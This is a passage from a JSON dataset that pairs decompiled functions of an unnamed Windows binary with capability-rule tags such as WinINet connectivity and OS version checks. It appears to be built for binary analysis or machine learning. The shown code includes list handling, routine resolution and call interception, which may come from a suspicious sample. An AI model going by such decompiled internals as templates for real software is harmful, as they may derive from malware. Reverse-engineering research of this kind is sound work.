            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000370a0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (arg_ch == 0) {\n        fcn.000569a0(arg_8h);\n        iVar1 = fcn.0001b770(arg_8h + 4, 0, 0);\n        if (iVar1 == 0) {\n            uVar2 = 1;\n        }\n        else {\n            fcn.000674e0(arg_8h);\n            uVar2 = 0;\n        }\n    }\n    else if (arg_ch == 1) {\n        iVar1 = fcn.0001b770(arg_8h + 4, 1, 0);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0001b770(arg_8h, 0, 0);\n            if (iVar1 == 0) {\n                uVar2 = 1;\n            }\n            else {\n                fcn.000674e0(arg_8h + 4);\n                uVar2 = 0;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else if (arg_ch == 2) {\n        fcn.000569a0(arg_8h + 8);\n        uVar2 = 1;\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 327
    },
    "00037240": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037240(int32_t *arg_8h)\n\n{\n    uint var_4h;\n    \n    if ((arg_8h == NULL) || (*arg_8h == 0)) {\n        var_4h = 0;\n    }\n    else {\n        var_4h = 1;\n    }\n    return var_4h;\n}\n",
        "token_count": 82
    },
    "00037270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037270(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    iVar1 = fcn.000785ec(*arg_8h, 0, 0);\n    if (iVar1 == 0) {\n        if (arg_ch != NULL) {\n            *arg_ch = 0xffffffff;\n        }\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.000785b6(iVar1);\n        fcn.000354e0(uVar2);\n        uVar2 = 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 155
    },
    "00037310": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037310(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (**0xb1bde2a4)(*arg_8h, 0, **0xb1bde1f8, 0, &var_4h, 0);\n    if (iVar1 == 0) {\n        (**0xb1bde1f4)(var_4h, 0x1f);\n        (**0xb1bde2e4)();\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.000785b6(iVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 171
    },
    "00037370": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037370(char *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_18h;\n    uint var_10h;\n    char *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_10h == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        var_ch = arg_8h;\n        do {\n            cVar1 = *var_ch;\n            var_ch = var_ch + 1;\n        } while (cVar1 != '\\0');\n        iVar3 = fcn.000786ee(arg_ch, arg_10h * 2 + -2, &var_4h, arg_8h, var_ch - (arg_8h + 1));\n        if (iVar3 == 0) {\n            *(arg_ch + var_4h) = 0;\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = 0xffffffff;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 260
    },
    "000373f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000373f0(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_18h;\n    uint var_10h;\n    int16_t *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_10h == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        var_ch = arg_8h;\n        do {\n            iVar1 = *var_ch;\n            var_ch = var_ch + 1;\n        } while (iVar1 != 0);\n        iVar3 = fcn.000786e8(arg_ch, arg_10h + -1, &var_4h, arg_8h, (var_ch - (arg_8h + 1) >> 1) << 1);\n        if (iVar3 == 0) {\n            *(arg_ch + var_4h) = 0;\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = 0xffffffff;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 271
    },
    "00037470": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00037470(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    uint var_10h;\n    uint var_8h;\n    int16_t *var_4h;\n    \n    var_4h = arg_8h;\n    do {\n        iVar1 = *var_4h;\n        var_4h = var_4h + 1;\n    } while (iVar1 != 0);\n    return (var_4h - (arg_8h + 1) >> 1) + 1;\n}\n",
        "token_count": 128
    },
    "000374c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.000374c0(char *arg_8h)\n\n{\n    char cVar1;\n    uint var_10h;\n    uint var_8h;\n    char *var_4h;\n    \n    var_4h = arg_8h;\n    do {\n        cVar1 = *var_4h;\n        var_4h = var_4h + 1;\n    } while (cVar1 != '\\0');\n    return var_4h + (1 - (arg_8h + 1));\n}\n",
        "token_count": 119
    },
    "00037560": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037560(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint *var_4h;\n    \n    var_10h = fcn.00035200(0x1a);\n    if (var_10h == 0) {\n        uVar1 = 0;\n    }\n    else {\n        fcn.00037620(var_10h);\n        var_18h = fcn.00035490(*arg_8h);\n        var_14h = fcn.00035490(arg_8h[1]);\n        var_4h = &var_18h;\n        for (var_8h = 0; var_8h < 8; var_8h = var_8h + 1) {\n            *(var_4h + var_8h) = *(var_4h + var_8h) ^ *(var_10h + var_8h);\n        }\n        var_ch = 10;\n        iVar2 = fcn.00034170(&var_18h, var_10h + 10, 8);\n        *(arg_ch + 4) = var_10h;\n        *(arg_ch + 8) = iVar2 + var_ch;\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 340
    },
    "00037a60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00037a60(void)\n\n{\n    uint var_f0h;\n    uint var_e8h;\n    uint var_e4h;\n    uint *var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    int32_t var_cch;\n    uint var_c8h;\n    \n    fcn.0002bd90(&var_c8h, 100);\n    fcn.00078550(&var_f0h, &var_c8h);\n    var_e8h = 0x18;\n    var_e4h = 0;\n    var_dch = 0;\n    var_e0h = &var_f0h;\n    var_d8h = 0;\n    var_d4h = 0;\n    var_cch = fcn.00078634(&var_d0h, 2, &var_e8h);\n    if (var_cch == 0) {\n        var_cch = fcn.000786f4(var_d0h, 0);\n        fcn.00078544(var_d0h);\n    }\n    return var_cch;\n}\n",
        "token_count": 258
    },
    "00037d60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037d60(int16_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    uint var_124h;\n    uint var_11ch;\n    int16_t *var_118h;\n    uint32_t var_114h;\n    uint var_110h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_118h = arg_8h;\n    do {\n        iVar1 = *var_118h;\n        var_118h = var_118h + 1;\n    } while (iVar1 != 0);\n    var_4h = var_118h - (arg_8h + 1) >> 1;\n    var_114h = 0;\n    if ((var_4h < 8) || (0x101 < var_4h)) {\n        uVar2 = 0;\n    }\n    else {\n        fcn.000373f0(arg_8h, &var_110h, 0x104);\n        for (var_8h = 0; var_8h < var_4h; var_8h = var_8h + 1) {\n            var_114h = *(&var_110h + var_8h) + var_114h;\n        }\n        *(&var_110h + var_4h) = (var_114h & 0xff) / 0x1a + 'a';\n        *(&var_110h + var_4h + 1) = 'z' - (var_114h & 0xff) % 0x1a;\n        fcn.00037370(&var_110h + var_4h, arg_ch, 2);\n        fcn.00037370(&var_110h + var_4h + 1, arg_10h, 2);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 447
    },
    "00037ec0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00037ec0(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00034a80(0xb1be18ec, &var_4h);\n    if (((((((iVar1 == 0) && (iVar1 = fcn.0005c850(var_4h, 0xb1be18f8, 0xb1c5b3d8),  iVar1 == 0)) &&\n           (iVar1 = fcn.0005c850(var_4h, 0xb1be1914, 0xb1c5b3dc),  iVar1 == 0)) &&\n          ((iVar1 = fcn.0005c850(var_4h, 0xb1be192c, 0xb1c5b3e0),  iVar1 == 0 &&\n           (iVar1 = fcn.0005c850(var_4h, 0xb1be194c, 0xb1c5b3e4),  iVar1 == 0)))) &&\n         (iVar1 = fcn.0005c850(var_4h, 0xb1be1968, 0xb1c5b3e8),  iVar1 == 0)) &&\n        (((((iVar1 = fcn.0005c850(var_4h, 0xb1be1984, 0xb1c5b3ec),  iVar1 == 0 &&\n            (iVar1 = fcn.0005c850(var_4h, 0xb1be199c, 0xb1c5b3f0),  iVar1 == 0)) &&\n           ((iVar1 = fcn.0005c850(var_4h, 0xb1be19b0, 0xb1c5b3f4),  iVar1 == 0 &&\n            (((iVar1 = fcn.0005c850(var_4h, 0xb1be19c0, 0xb1c5b3f8),  iVar1 == 0 &&\n              (iVar1 = fcn.0005c850(var_4h, 0xb1be19d8, 0xb1c5b3fc),  iVar1 == 0)) &&\n             (iVar1 = fcn.0005c850(var_4h, 0xb1be19ec, 0xb1c5b400),  iVar1 == 0)))))) &&\n          ((iVar1 = fcn.0005c850(var_4h, 0xb1be1a04, 0xb1c5b404),  iVar1 == 0 &&\n           (iVar1 = fcn.0005c850(var_4h, 0xb1be1a14, 0xb1c5b408),  iVar1 == 0)))) &&\n         (iVar1 = fcn.0005c850(var_4h, 0xb1be1a2c, 0xb1c5b40c),  iVar1 == 0)))) &&\n       ((((iVar1 = fcn.0005c850(var_4h, 0xb1be1a4c, 0xb1c5b410),  iVar1 == 0 &&\n          (iVar1 = fcn.0005c850(var_4h, 0xb1be1a70, 0xb1c5b414),  iVar1 == 0)) &&\n         ((iVar1 = fcn.0005c850(var_4h, 0xb1be1a90, 0xb1c5b418),  iVar1 == 0 &&\n          (((iVar1 = fcn.0005c850(var_4h, 0xb1be1aac, 0xb1c5b41c),  iVar1 == 0 &&\n            (iVar1 = fcn.0005c850(var_4h, 0xb1be1ac8, 0xb1c5b420),  iVar1 == 0)) &&\n           (iVar1 = fcn.0005c850(var_4h, 0xb1be1ae4, 0xb1c685b0),  iVar1 == 0)))))) &&\n        (((iVar1 = fcn.0005c850(var_4h, 0xb1be1b00, 0xb1c685c8),  iVar1 == 0 &&\n          (iVar1 = fcn.0005c850(var_4h, 0xb1be1b20, 0xb1c685bc),  iVar1 == 0)) &&\n         ((iVar1 = fcn.0005c850(var_4h, 0xb1be1b3c, 0xb1c685cc),  iVar1 == 0 &&\n          (((iVar1 = fcn.0005c850(var_4h, 0xb1be1b5c, 0xb1c685b4),  iVar1 == 0 &&\n            (iVar1 = fcn.0005c850(var_4h, 0xb1be1b70, 0xb1c685b8),  iVar1 == 0)) &&\n           ((iVar1 = fcn.0005c850(var_4h, 0xb1be1b84, 0xb1c685c4),  iVar1 == 0 &&\n            ((iVar1 = fcn.0005c850(var_4h, 0xb1be1ba0, 0xb1c685c0),  iVar1 == 0 &&\n             (iVar1 = fcn.0005c850(var_4h, 0xb1be1b70, 0xb1c685b8),  iVar1 == 0)))))))))))))) {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 1296
    },
    "000382d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.000382d0(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00034a80(0xb1be1bbc, &var_4h);\n    if (((((((iVar1 == 0) && (iVar1 = fcn.0005c850(var_4h, 0xb1be1bcc, 0xb1c5b424),  iVar1 == 0)) &&\n           (iVar1 = fcn.0005c850(var_4h, 0xb1be1be8, 0xb1c5b428),  iVar1 == 0)) &&\n          ((iVar1 = fcn.0005c850(var_4h, 0xb1be1c04, 0xb1c5b42c),  iVar1 == 0 &&\n           (iVar1 = fcn.0005c850(var_4h, 0xb1be1c18, 0xb1c5b430),  iVar1 == 0)))) &&\n         (iVar1 = fcn.0005c850(var_4h, 0xb1be1c30, 0xb1c5b434),  iVar1 == 0)) &&\n        (((((iVar1 = fcn.0005c850(var_4h, 0xb1be1c48, 0xb1c5b438),  iVar1 == 0 &&\n            (iVar1 = fcn.0005c850(var_4h, 0xb1be1c60, 0xb1c5b43c),  iVar1 == 0)) &&\n           ((iVar1 = fcn.0005c850(var_4h, 0xb1be1c70, 0xb1c5b440),  iVar1 == 0 &&\n            (((iVar1 = fcn.0005c850(var_4h, 0xb1be1c8c, 0xb1c5b444),  iVar1 == 0 &&\n              (iVar1 = fcn.0005c850(var_4h, 0xb1be1c9c, 0xb1c5b448),  iVar1 == 0)) &&\n             (iVar1 = fcn.0005c850(var_4h, 0xb1be1cb0, 0xb1c5b44c),  iVar1 == 0)))))) &&\n          (((iVar1 = fcn.0005c850(var_4h, 0xb1be1cc8, 0xb1c5b450),  iVar1 == 0 &&\n            (iVar1 = fcn.0005c850(var_4h, 0xb1be1cd8, 0xb1c5b454),  iVar1 == 0)) &&\n           ((iVar1 = fcn.0005c850(var_4h, 0xb1be1cec, 0xb1c5b458),  iVar1 == 0 &&\n            ((((iVar1 = fcn.0005c850(var_4h, 0xb1be1d08, 0xb1c5b45c),  iVar1 == 0 &&\n               (iVar1 = fcn.0005c850(var_4h, 0xb1be1d24, 0xb1c5b460),  iVar1 == 0)) &&\n              ((iVar1 = fcn.0005c850(var_4h, 0xb1be1d3c, 0xb1c5b464),  iVar1 == 0 &&\n               (((iVar1 = fcn.0005c850(var_4h, 0xb1be1d54, 0xb1c5b468),  iVar1 == 0 &&\n                 (iVar1 = fcn.0005c850(var_4h, 0xb1be1d7c, 0xb1c685a0),  iVar1 == 0)) &&\n                (iVar1 = fcn.0005c850(var_4h, 0xb1be1d98, 0xb1c68598),  iVar1 == 0)))))) &&\n             ((iVar1 = fcn.0005c850(var_4h, 0xb1be1da8, 0xb1c6859c),  iVar1 == 0 &&\n              (iVar1 = fcn.0005c850(var_4h, 0xb1be1dc8, 0xb1c685a4),  iVar1 == 0)))))))))) &&\n         (iVar1 = fcn.0005c850(var_4h, 0xb1be1de8, 0xb1c685ac),  iVar1 == 0)))) &&\n       (((iVar1 = fcn.0005c850(var_4h, 0xb1be1e08, 0xb1c685a8),  iVar1 == 0 &&\n         (iVar1 = fcn.0005c850(var_4h, 0xb1be1cec, 0xb1c5b458),  iVar1 == 0)) &&\n        (iVar1 = fcn.0005c850(var_4h, 0xb1be1e1c, 0xb1c68594),  iVar1 == 0)))) {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 1201
    },
    "000386a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000386a0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    var_ch = 0;\n    var_1ch = fcn.00040080(arg_8h, &fcn.000386a0::var_ch, &fcn.000386a0::var_18h);\n    if (var_1ch == 0) {\n        *0xb1c5b470 = 0;\n        fcn.00036f50(0xb1c5b474);\n        (**0xb1bde04c)(&fcn.000386a0::var_8h, 0xb1c5b46c, 0x100, 0x50, 0x10);\n        if (var_8h == 0) {\n            var_1ch = fcn.00034a80(0xb1be18ec, &fcn.000386a0::var_10h);\n            if ((((var_1ch == 0) && (var_1ch = fcn.0005c850(var_10h, 0xb1be1e2c, &fcn.000386a0::var_14h),  var_1ch == 0)\n                 ) && (var_1ch = fcn.0005c850(var_10h, 0xb1be1e4c, &fcn.000386a0::var_20h),  var_1ch == 0)) &&\n               ((var_1ch = fcn.000631a0(var_14h, 0xb1c05c10, 0xb1c5b480),  var_1ch == 0 &&\n                (var_1ch = fcn.000631a0(var_20h, 0xb1c05940, 0xb1c5b484),  var_1ch == 0)))) {\n                fcn.00036f40(0xb1c5b4f0, 1);\n                var_4h = 0;\n                while ((var_4h < var_18h && (var_ch != 0))) {\n                    var_2ch = *(var_ch + var_4h * 4);\n                    do {\n                        iVar1 = *(var_2ch + 8);\n                        var_2ch = *(iVar1 + 8);\n                        (**0xb1bde064)(iVar1);\n                        if (var_2ch == 0) break;\n                    } while (iVar1 != var_2ch);\n                    var_1ch = fcn.00038ec0(0x38850, *(iVar1 + 0xc), *(var_ch + var_4h * 4));\n                    if ((var_1ch != 0) || (var_1ch = fcn.00038da0(*(var_ch + var_4h * 4)),  var_1ch != 0)) break;\n                    var_4h = var_4h + 1;\n                }\n            }\n        }\n        else {\n            var_1ch = var_8h;\n        }\n        if (var_1ch != 0) {\n            fcn.000388a0();\n        }\n        fcn.00035330(var_ch);\n    }\n    return var_1ch;\n}\n",
        "token_count": 825
    },
    "000388a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.000388a0(void)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    while( true ) {\n        fcn.00037150(0xb1c5b474, &var_4h, 0);\n        iVar1 = *0xb1c5b470;\n        if (*0xb1c5b470 != 0) {\n            var_ch = *(*0xb1c5b470 + 0xc);\n        }\n        fcn.00037180(0xb1c5b474, &var_4h, 0);\n        if (iVar1 == 0) break;\n        fcn.00038c70(var_ch);\n    }\n    if (*0xb1c5b46c != 0) {\n        (**0xb1bde058)(*0xb1c5b46c);\n    }\n    fcn.000635f0(0xb1c5b480);\n    fcn.000635f0(0xb1c5b484);\n    fcn.00036f40(0xb1c5b4f0, 0);\n    return;\n}\n",
        "token_count": 283
    },
    "00038940": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00038940(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    fcn.00037150(0xb1c5b474, &var_8h, 1);\n    iVar1 = fcn.0001b770(0xb1c5b4f0, 0, 0);\n    if (iVar1 != 0) {\n        var_4h = fcn.00039000(arg_ch, 1);\n        if (var_4h != 0) {\n            var_ch = *(var_4h + 0xc);\n        }\n    }\n    fcn.00037180(0xb1c5b474, &var_8h, 1);\n    if (var_ch != 0) {\n        fcn.00038c70(var_ch);\n    }\n    pcVar2 = fcn.000639f0(arg_8h);\n    (*pcVar2)(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 271
    },
    "00038a30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00038a30(uint arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    iVar1 = fcn.00050a20();\n    if (iVar1 == 0) {\n        pcVar2 = fcn.000639f0(arg_8h);\n        (*pcVar2)(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    else {\n        iVar1 = fcn.0003d010(arg_ch, &var_4h);\n        if (iVar1 == 0) {\n            for (; var_8h < arg_14h; var_8h = var_8h + 1) {\n                iVar1 = *(arg_10h + var_8h * 4);\n                (**0xb1bde05c)(&var_ch, &var_18h, *0xb1c5b46c);\n                if (var_ch != 0) break;\n                var_14h = var_18h + 0x38;\n                *var_14h = iVar1;\n                *(var_18h + 0x18) = *(iVar1 + 0x18);\n                *(var_18h + 8) = *(iVar1 + 8);\n                *(var_18h + 0xc) = *(iVar1 + 0xc);\n                puVar4 = *(iVar1 + 0x1e) + iVar1;\n                puVar5 = *(var_18h + 0x1e) + var_18h;\n                for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar5 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    puVar5 = puVar5 + 1;\n                }\n                (**0xb1bde054)(var_18h, iVar1);\n                if (((*(iVar1 + 0x1d) & 0x80) == 0) || ((*(iVar1 + 0x1d) & 0x40) == 0)) {\n                    var_1ch = 0;\n                    var_10h = 0;\n                }\n                else {\n                    var_1ch = *(iVar1 + 0x18 + *(iVar1 + 0x1e));\n                    var_10h = *(iVar1 + 0x14 + *(iVar1 + 0x1e));\n                }\n                if (((var_1ch != 0) || (var_10h != 0)) && ((*(var_18h + 0x1d) & 0x80) != 0)) {\n                    *(var_18h + 0x1d) = *(var_18h + 0x1d) | 0x40;\n                    *(var_18h + 0x18 + *(var_18h + 0x1e)) = var_1ch;\n                    *(var_18h + 0x14 + *(var_18h + 0x1e)) = var_10h;\n                }\n                (**(var_4h + 0x54))(var_4h, &var_18h, 1);\n            }\n        }\n        if (var_8h != arg_14h) {\n            iVar1 = arg_14h - var_8h;\n            arg_10h = arg_10h + var_8h * 4;\n            pcVar2 = fcn.000639f0(arg_8h);\n            (*pcVar2)(arg_8h, arg_ch, arg_10h, iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 938
    },
    "00038c10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00038c10(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *puVar5;\n    uint var_4h;\n    \n    uVar4 = arg_ch;\n    puVar5 = arg_18h;\n    pcVar1 = fcn.000639f0(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, uVar4, arg_10h, arg_14h, puVar5);\n    if ((iVar2 == 0) && (iVar3 = fcn.00038ec0(arg_ch, 0, *arg_18h),  iVar3 == 0)) {\n        fcn.00038da0(*arg_18h);\n    }\n    return iVar2;\n}\n",
        "token_count": 215
    },
    "00038c70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00038c70(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = NULL;\n    var_ch = 0;\n    var_14h = 0;\n    if (arg_8h == 0) {\n        uVar1 = 0xc00000ef;\n    }\n    else {\n        fcn.00037150(0xb1c5b474, &var_8h, 0);\n        var_4h = fcn.00038f90(arg_8h, 1);\n        if (var_4h != NULL) {\n            var_ch = var_4h + 0x18;\n            var_14h = var_4h + 0x14;\n        }\n        fcn.00037180(0xb1c5b474, &var_8h, 0);\n        if (var_4h == NULL) {\n            uVar1 = 0xc000000d;\n        }\n        else {\n            iVar2 = fcn.000635f0(var_14h);\n            if (iVar2 == 0) {\n                fcn.000635f0(var_ch);\n            }\n            fcn.00037150(0xb1c5b474, &var_8h, 0);\n            var_10h = NULL;\n            for (var_4h = *0xb1c5b470; (var_4h != NULL && (var_4h[3] != arg_8h)); var_4h = *var_4h) {\n                var_10h = var_4h;\n            }\n            if (var_4h != NULL) {\n                if (var_10h == NULL) {\n                    *0xb1c5b470 = *var_4h;\n                }\n                else {\n                    *var_10h = *var_4h;\n                }\n            }\n            fcn.00037180(0xb1c5b474, &var_8h, 0);\n            fcn.00035330(var_4h);\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 520
    },
    "00038da0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
